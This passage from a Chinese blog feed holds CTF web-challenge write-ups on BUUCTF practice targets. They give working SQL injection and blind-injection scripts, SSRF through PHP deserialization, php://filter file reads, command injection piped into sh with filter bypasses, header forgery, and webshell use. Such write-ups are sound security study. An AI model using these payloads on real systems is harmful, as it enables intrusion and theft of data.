      &lt;p&gt;题目地址：&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯2018-Fakebook</title>
    <link href="http://lingxin16.github.io/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/"/>
    <id>http://lingxin16.github.io/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/</id>
    <published>2020-06-20T14:27:12.000Z</published>
    <updated>2020-06-20T15:45:12.792Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/1.png" alt="1"></p><p>the Fakebook</p><p>有login和join两个选项，join应该是注册，我们先尝试注册</p><p>注册成功之后直接登录</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/2.png" alt="2"></p><p>username这里可以点进去，进去之后是这样的</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/3.png" alt="3"></p><p>url格式是/view.php?no=1，猜测可以进行注入</p><p>当我们尝试进行注入的时候，发现有waf，当出现有union select的时候就会被拦截</p><p>这里用/**/代替空格进行绕过</p><p>/view.php?no=0 union/**/select 1,2,3,4–+的时候回显</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/4.png" alt="4"></p><p>/view.php?no=0 union/**/select 1,database(),3,4–+得到数据库名fakebook</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/5.png" alt="5"></p><p>/view.php?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’fakebook’–+得到表名user</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/6.png" alt="6"></p><p>/view.php?no=0 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=’fakebook’ and table_name=’users’–+得到列名</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/7.png" alt="7"></p><p>/view.php?no=0 union/**/select 1,group_concat(no,username,passwd,data),3,4 from fakebook.users –+得到数据</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/8.png" alt="8"></p><p>1d1a05b40f186efa8c4152341eb69a1c8ac32ea0c3d76d6d071427a902ed8ec88c320f54ca1d4e8301a9a43746c74826d2c9113dc30ff93a68e7eda21aa5d94ab4e69O:8:”UserInfo”:3:{s:4:”name”;s:4:”d1a0”;s:3:”age”;i:111;s:4:”blog”;s:11:”<a href="http://www.d1a0.cn&quot;;}" target="_blank" rel="noopener">www.d1a0.cn&quot;;}</a> </p><p>这里我们并没有得到flag，而是我们个人资料的反序列化数据，因为在数据中存在我们的博客地址，所以我们尝试使用ssrf读取flag，但是我们并不知道flag所在文件夹，用dirsearch扫描发现flag.php和robots.txt</p><p>robots.txt中存在</p><pre><code>User-agent: *Disallow: /user.php.bak</code></pre><p>下载得到</p><pre><code class="PHP">&lt;?phpclass UserInfo{    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)    {        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    }    function get($url)    {        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output = curl_exec($ch);        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode == 404) {            return 404;        }        curl_close($ch);        return $output;    }    public function getBlogContents ()    {        return $this-&gt;get($this-&gt;blog);    }    public function isValidBlog ()    {        $blog = $this-&gt;blog;        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);    }}</code></pre><p>构造payload</p><pre><code class="PHP">&lt;?phpclass Userinfo{    public $name = &quot;d1a0&quot;;    public $age = 111;    public $blog = &quot;file:///var/www/html/flag.php&quot;;}$data = new Userinfo();echo serialize($data);?&gt;</code></pre><p>/view.php?no=0 union/**/select 1,2,3,’O:8:”Userinfo”:3:{s:4:”name”;s:4:”d1a0”;s:3:”age”;i:111;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/9.png" alt="9"></p><p>看大佬们的博客，还有个非预期解</p><p>使用load_file()函数，直接得到flag，不过前提是知道flag文件位置 </p><p>payload：/view.php?no=0 union/**/select 1,load_file(‘/var/www/html/flag.php’),3,4</p><p>太棒了，又学到了许多<img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/10.jpg" alt="10"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019华北赛区Day2-HackWorld</title>
    <link href="http://lingxin16.github.io/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/"/>
    <id>http://lingxin16.github.io/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/</id>
    <published>2020-06-19T02:23:07.000Z</published>
    <updated>2020-06-19T02:39:19.674Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/1.png" alt="1"></p><p>结合提示，是个sql注入类型的题目，尝试注入测试</p><p>输入单个字母的话提示bool(false)，输入1提示Hello, glzjin wants a girlfriend.  输入2提示Do you want to be my girlfriend?其他数字则是Error Occured When Fetch Result.</p><p>能猜出来是布尔盲注了，而且这里还有过滤，可以用burpsuit来fuzz一下，这里贴出来源代码吧</p><pre><code class="php">&lt;?php$dbuser=&#39;root&#39;;$dbpass=&#39;root&#39;;function safe($sql){    #被过滤的内容 函数基本没过滤    $blackList = array(&#39; &#39;,&#39;||&#39;,&#39;#&#39;,&#39;-&#39;,&#39;;&#39;,&#39;&amp;&#39;,&#39;+&#39;,&#39;or&#39;,&#39;and&#39;,&#39;`&#39;,&#39;&quot;&#39;,&#39;insert&#39;,&#39;group&#39;,&#39;limit&#39;,&#39;update&#39;,&#39;delete&#39;,&#39;*&#39;,&#39;into&#39;,&#39;union&#39;,&#39;load_file&#39;,&#39;outfile&#39;,&#39;./&#39;);    foreach($blackList as $blackitem){        if(stripos($sql,$blackitem)){            return False;        }    }    return True;}if(isset($_POST[&#39;id&#39;])){    $id = $_POST[&#39;id&#39;];}else{    die();}$db = mysql_connect(&quot;localhost&quot;,$dbuser,$dbpass);if(!$db){    die(mysql_error());}   mysql_select_db(&quot;ctf&quot;,$db);if(safe($id)){    $query = mysql_query(&quot;SELECT content from passage WHERE id = ${id} limit 0,1&quot;);    if($query){        $result = mysql_fetch_array($query);        if($result){            echo $result[&#39;content&#39;];        }else{            echo &quot;Error Occured When Fetch Result.&quot;;        }    }else{        var_dump($query);    }}else{    die(&quot;SQL Injection Checked.&quot;);}</code></pre><p>可以看到过滤了空格等很多东西，但是也有很多东西没过滤</p><p>因为我能力有限，还是研究师傅们的代码吧</p><pre><code class="python">import requestsimport base64import sysimport stringimport hashlibimport ioimport timesys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;)        #改变标准输出的默认编码,否则s.text不能输出x = string.printableflag = &quot;&quot;url = &quot;http://56039d8e-d2a3-4fc1-8195-3e18f2c1ea8c.node3.buuoj.cn/index.php&quot;payload={    &quot;id&quot; : &quot;&quot;}for i in range(0,60):    for j in x:        payload[&quot;id&quot;] = &quot;1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1&quot;%(str(i),ord(j))        s = requests.post(url,data=payload)        #print(s.text)        if &quot;Hello&quot; in s.text:            flag += j            print(flag)            breakprint(flag)</code></pre><p>但是这个代码我运行的时候报错，所以删掉了<code>sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;)</code></p><p>能够正常运行，得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>强网杯2019-高明的黑客</title>
    <link href="http://lingxin16.github.io/2020/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"/>
    <id>http://lingxin16.github.io/2020/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</id>
    <published>2020-06-18T13:54:26.000Z</published>
    <updated>2020-06-18T14:40:13.072Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/1.png" alt="1"></p><p>网站源码到<a href="http://www.tar.gz以供大家观赏，说明网站源码备份" target="_blank" rel="noopener">www.tar.gz以供大家观赏，说明网站源码备份</a></p><p>访问/<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a>  得到一个压缩包</p><p>解压缩，得到3002个php文件，3002个……</p><p><img src="/2020/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/2.png" alt="2"></p><p>我这种菜狗，看到这种，头都要没了</p><p>还是看赵师傅的wp吧</p><p><a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019%E5%BC%BA%E7%BD%91%E6%9D%AF#toc-heading-6" target="_blank" rel="noopener">https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019%E5%BC%BA%E7%BD%91%E6%9D%AF#toc-heading-6</a></p><p>赵师傅的代码</p><pre><code class="Python">import osimport threadingfrom concurrent.futures.thread import ThreadPoolExecutorimport requestssession = requests.Session()path = &quot;/Users/jinzhao/PhpstormProjects/qwb/web2/&quot;  # 文件夹目录files = os.listdir(path)  # 得到文件夹下的所有文件名称mutex = threading.Lock()pool = ThreadPoolExecutor(max_workers=50)def read_file(file):    f = open(path + &quot;/&quot; + file);  # 打开文件    iter_f = iter(f);  # 创建迭代器    str = &quot;&quot;    for line in iter_f:  # 遍历文件，一行行遍历，读取文本        str = str + line    # 获取一个页面内所有参数    start = 0    params = {}    while str.find(&quot;$_GET[&#39;&quot;, start) != -1:        pos2 = str.find(&quot;&#39;]&quot;, str.find(&quot;$_GET[&#39;&quot;, start) + 1)        var = str[str.find(&quot;$_GET[&#39;&quot;, start) + 7: pos2]        start = pos2 + 1        params[var] = &#39;echo(&quot;glzjin&quot;);&#39;        # print(var)    start = 0    data = {}    while str.find(&quot;$_POST[&#39;&quot;, start) != -1:        pos2 = str.find(&quot;&#39;]&quot;, str.find(&quot;$_POST[&#39;&quot;, start) + 1)        var = str[str.find(&quot;$_POST[&#39;&quot;, start) + 8: pos2]        start = pos2 + 1        data[var] = &#39;echo(&quot;glzjin&quot;);&#39;        # print(var)    # eval test    r = session.post(&#39;http://localhost:11180/web2/&#39; + file, data=data, params=params)    if r.text.find(&#39;glzjin&#39;) != -1:        mutex.acquire()        print(file + &quot; found!&quot;)        mutex.release()    # assert test    for i in params:        params[i] = params[i][:-1]    for i in data:        data[i] = data[i][:-1]    r = session.post(&#39;http://localhost:11180/web2/&#39; + file, data=data, params=params)    if r.text.find(&#39;glzjin&#39;) != -1:        mutex.acquire()        print(file + &quot; found!&quot;)        mutex.release()    # system test    for i in params:        params[i] = &#39;echo glzjin&#39;    for i in data:        data[i] = &#39;echo glzjin&#39;    r = session.post(&#39;http://localhost:11180/web2/&#39; + file, data=data, params=params)    if r.text.find(&#39;glzjin&#39;) != -1:        mutex.acquire()        print(file + &quot; found!&quot;)        mutex.release()    # print(&quot;====================&quot;)for file in files:  # 遍历文件夹    if not os.path.isdir(file):  # 判断是否是文件夹，不是文件夹才打开        # read_file(file)        pool.submit(read_file, file)</code></pre><p>访问 /xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</p><p>得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2020新生赛-Include</title>
    <link href="http://lingxin16.github.io/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/"/>
    <id>http://lingxin16.github.io/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/</id>
    <published>2020-06-18T13:42:07.000Z</published>
    <updated>2020-06-18T13:53:11.037Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/1.png" alt="1"></p><p>tips指向?file=flag.php</p><p><img src="/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/2.png" alt="2"></p><p>访问?file=php://filter/read/convert.base64-encode/resource=flag.php</p><p>得到flag.php的base64加密后的内容</p><p><img src="/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/3.png" alt="3"></p><p>然后base64解码得flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>GXYCTF2019-PingPingPing</title>
    <link href="http://lingxin16.github.io/2020/06/17/GXYCTF2019-PingPingPing/"/>
    <id>http://lingxin16.github.io/2020/06/17/GXYCTF2019-PingPingPing/</id>
    <published>2020-06-17T14:02:17.000Z</published>
    <updated>2020-06-17T15:17:32.918Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/1.png" alt="1"></p><p>只有一个/?ip=</p><p>尝试传?ip=127.0.0.1，得到回显</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/2.png" alt="2"></p><p>利用管道符漏洞，传?ip=127.0.0.1||ls</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/3.png" alt="3"></p><p>看到flag.php 传?ip=127.0.0.1||cat%20flag.php</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/4.png" alt="4"></p><p>尝试传一下，得知如果我们传入的字符含有flag空格或者/，那么就会返回错误</p><p>这里用$IFS$1来绕过空格的限制，传?ip=127.0.0.1||cat$IFS$1index.php</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/5.png" alt="5"></p><p>可以看到确实过滤了很多</p><p>这里我用三种办法</p><h4 id="1-变量替换"><a href="#1-变量替换" class="headerlink" title="1.变量替换"></a>1.变量替换</h4><p><code>preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip</code></p><p>因为这个会判断输入语句中是否按顺序出现f l a g，所以我们用</p><p>?ip=127.0.0.1||a=g;cat$IFS$1fla$a.php</p><h4 id="2-内敛执行"><a href="#2-内敛执行" class="headerlink" title="2.内敛执行"></a>2.内敛执行</h4><pre><code>?ip=127.0.0.1||a=g;cat$IFS$1`ls`</code></pre><h4 id="3-sh"><a href="#3-sh" class="headerlink" title="3.sh"></a>3.sh</h4><p>既然过滤了bash，那么可以用sh</p><p>?ip=127.0.0.1||echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</p><p>其中Y2F0IGZsYWcucGhw是base64加密之后的cat flag.php</p><p>关于命令执行的绕过，可以参考ghtwf01师傅的这篇文章：<a href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener">命令执行漏洞利用及绕过方式总结</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-Http</title>
    <link href="http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/"/>
    <id>http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/</id>
    <published>2020-06-13T14:06:42.000Z</published>
    <updated>2020-06-13T14:24:55.053Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/1.png" alt="1"></p><p>主页并没有什么有用的信息，查看源文件，发现Secret.php</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/2.png" alt="2"></p><p>打开</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/3.png" alt="3"></p><p>提示It doesn’t come from ‘<a href="https://www.Sycsecret.com&#39;" target="_blank" rel="noopener">https://www.Sycsecret.com&#39;</a></p><p>那么就是http头伪造 利用burpsuit抓包修改 或者火狐编辑消息头</p><p>这里我用火狐 添加Referer:<a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a></p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/4.png" alt="4"></p><p>然后看到Please use “Syclover” browser</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/5.png" alt="5"></p><p>那么再更改User-Agent: “Syclover” browser</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/6.png" alt="6"></p><p>看到No!!! you can only read this locally!!!</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/7.png" alt="7"></p><p>那么再修改X-Forwarded-For: 127.0.0.1</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/8.png" alt="8"></p><p>得到flag</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/9.png" alt="9"></p><p>上边的操作也可以用Python脚本实现</p><pre><code class="Python"># -*- coding: UTF-8 -*-import requestsurl=&quot;http://node3.buuoj.cn:29753/Secret.php&quot;headers={    &quot;Referer&quot;: &quot;https://www.Sycsecret.com&quot;,    &quot;Origin&quot;:&quot;https://www.Sycsecret.com&quot;,    &quot;User-Agent&quot;: &quot;Syclover&quot;,    &quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;}r=requests.get(url=url,headers=headers)print(r.text)</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-Knife</title>
    <link href="http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/"/>
    <id>http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/</id>
    <published>2020-06-13T13:52:32.000Z</published>
    <updated>2020-06-13T13:58:54.746Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/1.png" alt="1"></p><p>上边有提示我家菜刀丢了，你能帮我找一下么</p><p>并且有<code>eval($_POST[&quot;Syc&quot;]);</code>说明连接密码是Syc</p><p>既然提示菜刀，那么我们用菜刀连接</p><p>这里我用蚁剑，测试连接成功</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/2.png" alt="2"></p><p>在根目录找到flag</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/3.png" alt="3"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-PHP</title>
    <link href="http://lingxin16.github.io/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/"/>
    <id>http://lingxin16.github.io/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/</id>
    <published>2020-06-12T13:58:03.000Z</published>
    <updated>2020-06-12T15:17:09.035Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/1.png" alt="1"></p><p>描述中说有备份网站的习惯，尝试常见的网站备份地址，发现<a href="http://www.zip文件存在" target="_blank" rel="noopener">www.zip文件存在</a></p><p>下载解压，发现存在五个文件</p><p><img src="/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/2.png" alt="2"></p><p>其中三个PHP文件代码分别为</p><p>index.php</p><pre><code class="php+HTML">&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;I have a cat!&lt;/title&gt;  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;&lt;/head&gt;&lt;style&gt;    #login{           position: absolute;           top: 50%;           left:50%;           margin: -150px 0 0 -150px;           width: 300px;           height: 300px;       }       h4{           font-size: 2em;           margin: 0.67em 0;       }&lt;/style&gt;&lt;body&gt;```index.php&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;I have a cat!&lt;/title&gt;  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;&lt;/head&gt;&lt;style&gt;    #login{           position: absolute;           top: 50%;           left:50%;           margin: -150px 0 0 -150px;           width: 300px;           height: 300px;       }       h4{           font-size: 2em;           margin: 0.67em 0;       }&lt;/style&gt;&lt;body&gt;&lt;div id=&quot;world&quot;&gt;    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯    &lt;/div&gt;    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！    &lt;/div&gt;    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt;    &lt;?php    include &#39;class.php&#39;;    $select = $_GET[&#39;select&#39;];    $res=unserialize(@$select);    ?&gt;    &lt;/div&gt;    &lt;div style=&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;script src=&#39;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&#39;&gt;&lt;/script&gt;&lt;script src=&#39;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&#39;&gt;&lt;/script&gt;&lt;script src=&#39;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&#39;&gt;&lt;/script&gt;&lt;script src=&#39;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&#39;&gt;&lt;/script&gt;&lt;script  src=&quot;index.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>class.php</p><pre><code class="PHP">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><p>flag.php</p><pre><code class="php">&lt;?php$flag = &#39;Syc{dog_dog_dog_dog}&#39;;?&gt;</code></pre><p>可以看到在index.php中包含了class.php 代码如下</p><pre><code class="PHP">&lt;?php    include &#39;class.php&#39;;    $select = $_GET[&#39;select&#39;];    $res=unserialize(@$select);    ?&gt;</code></pre><p>从这几行代码中，推断与反序列化有关</p><p>然后看class.php几个关键函数</p><pre><code>__construct构造函数__wakeup函数__destruct析构函数</code></pre><p>关于__wakeup函数的漏洞，参考<a href>wakeup()函数漏洞以及实际漏洞分析</a></p><p><code>__wakeup()</code>漏洞，简要来说就是当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup()</code>的执行</p><p>这里我们需要构造username等于admin和password等于100来echo flag</p><pre><code class="PHP">&lt;?phpclass Name{    private $username = &#39;admin&#39;;    private $password = &#39;100&#39;;}$a = new Name();echo serialize($a);?&gt;</code></pre><p>得到O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;s:3:”100”;}</p><p>为了绕过<code>__wakeup()</code> 我们将2改为3</p><p>得到O:4:”Name”:3:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;s:3:”100”;}</p><p>然后关于private声明变量</p><p>private 